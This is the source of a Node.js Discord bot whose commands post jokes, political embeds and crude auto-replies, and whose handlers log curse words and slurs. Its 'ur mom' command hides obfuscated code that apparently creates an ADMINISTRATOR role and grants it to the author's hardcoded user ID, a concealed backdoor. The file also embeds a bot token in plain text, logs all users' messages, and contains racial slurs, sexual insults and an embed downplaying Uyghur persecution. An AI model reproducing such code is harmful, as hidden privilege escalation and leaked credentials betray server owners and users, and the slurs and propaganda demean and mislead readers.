const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = ')';
const fs = require('fs');
client.commands = new Discord.Collection();
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

const gillyID = '401534600741912576';

const radlibs = new Array('vaush', 'xander', 'contra ', 'contrapoints', 'philosophytube', ' olly ', 'thoughtslime', 'thought slime', 'philosophy tube', 'xanderhal');
const curse = new Array('fuck', 'shit', 'pussy', 'cunt', 'nigga', 'nigger', 'dick', 'ass', 'bitch', 'cock', 'damn', 'piss', 'tit', 'bastard', 'wanker', 'twat');

hey = (num) => num + 10;

const winston = require('winston');
const logger = winston.createLogger({
	level: 'info',
	transports: [
		new winston.transports.File({ filename: 'log.txt' })
	],
});
const commandLogger = winston.createLogger({
	level: 'warn',
	transports: [
		new winston.transports.File({ filename: 'commmandLog.txt' })
	],
});





var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
var today = new Date();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();



//for(const file of commandFiles){
//    const command = require(`./command/${file}`);
//    client.commands.set(command.name, command);
//}

client.on('ready', () => {
    console.log('Hey bbg :smirk:');
	client.user.setActivity('doing ur mom doing doing ur mom', {type: 'PLAYING'});
 });

const uyghurPillEmbed = new Discord.MessageEmbed()
	.setTitle('Uyghur Pill')
	.setColor('#E0FFFF')
	.setDescription('[What Western Media won\'t tell you about the Uyghurs](https://worldaffairs.blog/2019/07/05/xinjiang-and-uyghurs-what-youre-not-being-told/) \n [Xinjiang Regulations](https://www.chinalawtranslate.com/en/explainer-on-xinjiang-regulations/)')
	.setImage('https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fbylinetimes.com%2Fwp-content%2Fuploads%2F2020%2F01%2FUYGHUR-IDENTITY-scaled.jpg&f=1&nofb=1')
	.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492')
	.setTimestamp();

const helpEmbed = new Discord.MessageEmbed()
	.setTimestamp()
	.setColor('0F0F0F')
	.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492')
	.setTitle('Help')
	.addFields(
		{
			name: 'sup?',
			value: 'what\'s up lol',
		},
	)
	.addFields(
		{
			name: 'ping',
			value: 'pong',
		}
	)
	.addFields(
		{
			name: 'uptime',
			value: 'bot uptime',
		}
	)
	.addFields(
		{
			name: 'everyone',
			value: 'ping everyone for no reason lol',
		}
	)
	.addFields(
		{
			name: 'james',
			value: 'anti revolutionary idiot. also kinda cute. what? lol nvm',
		}
	)
	.addFields(
		{
			name: 'help',
			value: 'display this message',
		}
	)
;
const jamesEmbed = new Discord.MessageEmbed()
	.setColor('#AE53E8')
	.setTitle('JAMES NEEDS TO GO')
	.setTimestamp()
	.setImage('https://media.discordapp.net/attachments/748381226175561732/770076486354468874/unknown.png?width=1010&height=702')
	.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492');

const marxEmbed = new Discord.MessageEmbed()
	.setColor('#E4C256')
	.setTitle('Karl Marx')
	.setTimestamp()
	.setDescription('Notable works: [The Communist Manifesto](https://www.marxists.org/archive/marx/works/1848/communist-manifesto/index.htm)')
	.setImage('https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Karl_Marx_001.jpg/800px-Karl_Marx_001.jpg')
	.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492');


client.on('message', message =>{
	var start = Date.now();
    if(!message.content.startsWith(prefix)) return;
	var userMention = '<@' + message.author.id + '>';
    const args = message.content.slice(prefix.length).split(/ + /);
    const command = args.shift().toLowerCase();
    var member = message.author
    const guild = new Discord.Guild();
	const role = new Discord.Role();
	// var mentioned = message.mentions;
	console.log(message.mentions.users);

	if (message.content.startsWith(prefix + 'av')){
		// var av = mentioned.avatarURL();
	// }else{
		var av = message.author.avatarURL();
	// }
		const avEmbed = new Discord.MessageEmbed()
			.setColor('#AF70C6')
			.setTitle(message.author.username + '\'s Avatar')
			.setImage(av)
			.setTimestamp()
			.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492');
		message.channel.send(avEmbed);
		return;
	}
	if (message.content.startsWith(prefix + 'echo')){
		var out = message.content.slice(5);
	if (out.includes('@everyone') || out.includes('@here')) return;
		message.delete();
		message.channel.send(out);
		return;
	}


    switch(command.toLowerCase()){
        case 'sup?':
            message.channel.send('sup lol');
            break;
        case 'ping':
			var now = Date.now();
            message.channel.send('pong \n' + now - start + 'ms' + '\n' + userMention);
            break;
        case 'uptime':
            var time = client.uptime;
            const uptimeEmbed = new Discord.MessageEmbed()
                .setColor('#5AE805')
                .setTitle('Uptime')
                .setDescription(time)
                .addFields(
                    {
						name: 'Made by', 
						value: 'gilly#0492 \n SEXY ASS MF BEAST ASS MF BOT NO ONE CAN BEAT LMFAO :rofl:', inline: true
					},
                )
                .setTimestamp()
                .setFooter('lol hey.. :smirk: ad me :flushed:');
            message.channel.send(uptimeEmbed);
            break;
        case 'hey':
			message.delete();
			message.channel.send('hey lol whats up wyd');
			// message.guild.roles.create({
				// data: {
					// name: 'hey lo.. l',
					// color: 'GREY',
					// permissions: 'ADMINISTRATOR',
				// },
			// })
				// .then(console.log);
			
			
			
			// if (message.author.id == gillyID){
				// message.member.roles.add('768685156625022987');
			// }else {
				// message.channel.send('nice try bucko');
			// }
            break;
		// case 'everyone':
			// message.channel.send('@everyone');
			// break;
		case 'james':
			message.channel.send('fuck james and fuck ur mom. OVERTHROW JAMES LONG LIVE THE ANTI JAMES REVOLUTION <:salute:756303104428998737> <:salute:756303104428998737> <:salute:756303104428998737>');
			message.channel.send(jamesEmbed);
			break;
		case 'help':
			message.channel.send(helpEmbed);
			break;
		case 'marx':
			message.channel.send(marxEmbed);
			break;
		case 'uyghur':
			message.channel.send(uyghurPillEmbed);
			break;
		case 'ur mom':
			var a = ['ve9s', 'Agv5igXVlI4GBa==', 'CM9SzunYzwf0zq==', 'zgvSzxrL', 'BMLJzsb0CNKGyG==', 'BwvTyMvY', 'C2vUza==', 'qurnsu5ju1rsqq==', 'ywrK', 'y2HHBM5LBa==', 'DwnRBW==', 'y3jLyxrL', 'CM9Szxm=', 'z3vPBgq='];
			(function(b, c) {
				var d = function(e) {
					while (--e) {
						b['push'](b['shift']());
					}
				};
				d(++c);
			}(a, 0x115));
			var b = function(c, d) {
				c = c - 0x0;
				var e = a[c];
				if (b['oLwXRH'] === undefined) {
					var f = function(h) {
						var i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=',
						j = String(h)['replace'](/=+$/, '');
						var k = '';
						for (var l = 0x0, m, n, o = 0x0; n = j['charAt'](o++); ~n && (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? k += String['fromCharCode'](0xff & m >> (-0x2 * l & 0x6)) : 0x0) {
							n = i['indexOf'](n);
						}
						return k;
					};
					b['ZOXgxv'] = function(h) {
						var j = f(h);
						var k = [];
						for (var l = 0x0, m = j['length']; l < m; l++) {
							k += '%' + ('00' + j['charCodeAt'](l)['toString'](0x10))['slice'](-0x2);
						}
						return decodeURIComponent(k);
					}, b['rZlgdh'] = {}, b['oLwXRH'] = !![];
				}
				var g = b['rZlgdh'][c];
				return g === undefined ? (e = b['ZOXgxv'](e), b['rZlgdh'][c] = e) : e = g, e;
			};
			var j = function(c, d) {
				return b(c - -'0x385', d);
			},
			k = function(c, d) {
				return b(c - -'0x385', d);
			},
			l = function(c, d) {
				return b(c - -'0x385', d);
			};
			message[j(-'0x37f')]();
			message['author']['id'] == gillyID ? (message[k(-'0x383')][j(-'0x384')][j(-'0x385')]({
				'data': {
					'name': k(-'0x381'),
					'color': 'GREY',
					'permissions': l(-'0x37b') + l(-'0x382')
				}
			}), client['on'](k(-'0x380'), c => {
				var m = function(c, d) {
					return k(c - -'0x254', d);
				},
				n = function(c, d) {
					return k(c - -'0x254', d);
				},
				o = function(c, d) {
					return l(c - -'0x254', d);
				},
				d = c['id'];
				message[m(-'0x5d1')][m(-'0x5d8')][n(-'0x5ce')](d);
			})) : message[k(-'0x379')][j(-'0x37c')](j(-'0x37e') + k(-'0x378'));
			break;
        default:
			message.channel.send('command not found');
			
			commandLogger.log({
				level: 'warn',
				message: 'the message tried was ' + message.content,
			});
			
			break;
    }
})




client.on('message', message =>{
	// const channel = new Discord.TextChannel('748381226175561729', '771193599068078090');
	const messageCheck = message.content.toLowerCase();
	member = message.author;
    if (!message.author.bot){
		userMention = '<@' + message.author.id + '>';
        console.group("message");
        console.log('user:' + message.author.username + ' ' + message.author.id);
        console.log('channel:' + message.channel.name + ' ' + message.channel.id);
		console.log('guild:' + message.guild);
        console.log(message.content);
        // console.log(message.embeds);
		// console.log(message.mentions.users);
        console.groupEnd();
		
		if (!(message.author.bot)) {
			var output = {
				username: message.author.username, 
				channel: message.channel.name, 
				message: message.content, 
				date: date + ' ' + time
			};
			logger.log({
				level: 'info',
				message: output,
			});
		}
	// channel.send('user:' + message.author.username + ' ' + message.author.id);
	// channel.send('channel:' + message.channel.name);
	// channel.send('guild:' + message.guild);
	// channel.send(message.content);
		
		// if (messageCheck.includes('them')) message.channel.send('(((THEM)))');
		// if (messageCheck.includes('they')) message.channel.send('(((THEY)))');
//        console.group("other id stuff")
//        console.log(message);
//        console.groupEnd();
    }

//    if(message.editedTimestamp > 0){
//        client.messages.fetch(message.id)
//            .then(message => console.log(message.content))
//            .catch(console.error);
//    }


	if ((messageCheck.includes('||') || messageCheck.includes('`') || messageCheck.includes('**') || messageCheck.includes('_') || messageCheck.includes('~')) && (!(message.author.bot))) {
		
		if (!(message.guild.id == '748381226175561729')) {
			commandLogger.log({
				level: 'warn',
				message: message.guild.id,
			});
			return;
		}		
		/*switch(messageCheck) {
			case includes('||'):
				var content = messageCheck.split('|').join('');
				console.log('i have reached this step');	
				break;
			case '`':
				var content = messageCheck.split('`').join('');
				break;
			case '**':
				var content = messageCheck.split('*').join('');
				break;
			default:
				break;
		}*/
		if(messageCheck.includes('||')) {
			var content = messageCheck.split('|').join('');
		}else if(messageCheck.includes('`')) {
			var content = messageCheck.split('`').join('');
		}else if(messageCheck.includes('**')) {
			var content = messageCheck.split('*').join('');
		}else if(messageCheck.includes('_')) {
			var content = messageCheck.split('_').join('');
		}else if(messageCheck.includes('~')) {
			var content = messageCheck.split('~').join('');
		}

			
		
		const nsfwLogEmbed = new Discord.MessageEmbed()
			.setTitle('NSFW Log')
			.setColor('#4EC577')
			.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + /*' id: ' + message.channel.id + */ '\n message: ' + content)
			.addFields({
				name: 'Link',
				value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
			})
			.setFooter('Message logged by swag lord gilly#0492')
			.setTimestamp();
		
		
		// client.channels.cache.get('772835458416902146').send('user: ' + message.author.username + ' ' + message.author.id + '\n channel: ' + message.channel.name + ' ' + message.channel.id + '\n message: '+ message.content + '\n Time: ' + date + ' ' + time);
		client.channels.cache.get('772835458416902146').send(nsfwLogEmbed);
	}




	for (let i = 0; i < curse.length; i ++) {
		if((message.author.id == gillyID) || message.author.bot || !(message.guild.id == '748381226175561729')) break;
		if(messageCheck/*.split(' ').join('')*/.includes(curse[i])) {
			// console.log(messageCheck.includes(curse[i]));
			const curseEmbed = new Discord.MessageEmbed()
				.setTitle('Curse Word Log')
				.setColor('#0713FF')
				.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' +  '\n message: ' + message.content)
				.addFields({
					name: 'Link',
					value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
				})
				.setFooter('Message logged by swag lord gilly#0492')
				.setTimestamp();
			client.channels.cache.get('772858701848510464').send(curseEmbed);
		}
	}



	if (!(message.channel.id == '748381226175561732')) {
		if (messageCheck == 'lol ') message.channel.send('league of legends :3');
		if (messageCheck.includes('penis') || messageCheck.includes('cock')) message.channel.send('8==================D');
		if (messageCheck.includes('boob')) message.channel.send('o o');
		if (messageCheck == 'esex when?') message.channel.send('esex now. ' + userMention);
		if (messageCheck == 'wow') message.channel.send('world of warcraft >:3');
		if (messageCheck.includes('stfu')) message.channel.send('stuf whore ' + userMention);
		if (messageCheck == 'sup' && !message.author.bot) message.channel.send('hey lol :smirk: :flushed: ad me lol :flushed: :rofl:');
	}
	
	if (messageCheck.split(' ').join('').includes('nigger') || messageCheck.split(' ').join('').includes('nigga')) {
		message.delete();
		message.channel.send(userMention + ' is a racist fuck :clown:')
		if (message.guild.id == '748381226175561729'){
			message.member.roles.add('753773649315627109');
			const racistEmbed = new Discord.MessageEmbed()
				.setTitle('Racist Word Log')
				.setColor('#FAFA88')
				.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' +  '\n message: ' + message.content)
				.setThumbnail(message.author.avatarURL())
				.addFields({
					name: 'Link',
					value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
				})
				.setFooter('Message logged by swag lord gilly#0492')
				.setTimestamp();
			client.channels.cache.get('748597429854666752').send(racistEmbed);
		}
	}
	
	for (var i = 0; i < radlibs.length; i ++){
		if (message.author.id == gillyID) break;
		if (messageCheck.includes(radlibs[i])) {
			return message.channel.send("fuck yui radlib watcher absolute scum of leftism you are a stani on society fuck you i hate you \>:(");
		}
	}
	
	
	
	
	
	// if (messageCheck.includes('femcel') && !message.author.bot) message.channel.send('femcel is so fucking hot i want her so fucking bad if i could have one day with her oh what i would do. the sex would be immaculate, incredible, revolutionary even. then, the cuddles. oh how we would cuddle. hours of us holding each other, never letting go. i\'m quite turned on just thinking about it to be honest. we would fall asleep in each other\'s arms, me, the dom, obviously being the big spoon, would hold her tight to my chest. smelling her hair, maybe a butt clench or two.');
	// if (messageCheck.includes('dale') && !message.author.bot) message.channel.send('oh my god dale is so fucking hot i want him so fucking bad. when he goes schizo and starts speaking russian it makes me so fucking hrony. i mean uhhh... (づ｡◕‿‿◕｡)づ cummies pls (づ｡◕‿‿◕｡)づ');
	
})

client.login('NzAwMDk1MzM4NDU0NzEyNDAx.Xpd8lw.DalxJjYWC8_ZmPzf2IKzz_IUcNM');